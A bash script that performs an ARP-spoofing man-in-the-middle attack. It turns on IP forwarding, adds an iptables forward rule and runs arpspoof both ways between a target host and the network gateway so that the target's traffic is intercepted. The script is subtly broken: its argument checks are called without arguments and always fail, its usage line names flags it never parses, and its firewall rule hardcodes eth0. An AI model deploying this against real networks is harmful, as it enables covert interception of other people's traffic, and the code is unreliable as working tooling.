#!/bin/bash

check_args () {
	if [ $# -ne 2 ]; then
		echo "Usage: $0 -i <interface> -t <target_ip>"
		exit 1
	fi
}

IFACE=$1
TARGET=$2
GATEWAY=$(ip route | grep default | cut -d ' ' -f3)

check_iface () {
	ip a s $1 &> /dev/null
	if [ $? -ne 0 ]; then
		echo "Interface not found"
		exit 1
	fi
}

setup () {

	# First we enable IPv4 forward
	echo 1 > /proc/sys/net/ipv4/ip_forward

	# Then we enable the firewall rule to actually permit traffic flowing through the interface

	# The rule will be deleted upon restart
	# If you wish to manually delete it after running the script, execute the same command with -A (append) changed to -D (delete)

	iptables -A FORWARD --in-interface eth0 -j ACCEPT
}

spoof () {
	arpspoof -i ${IFACE} -t $1 $2 &> /dev/null &
}

check_args
check_iface
setup
spoof ${TARGET} ${GATEWAY}
spoof ${GATEWAY} ${TARGET}
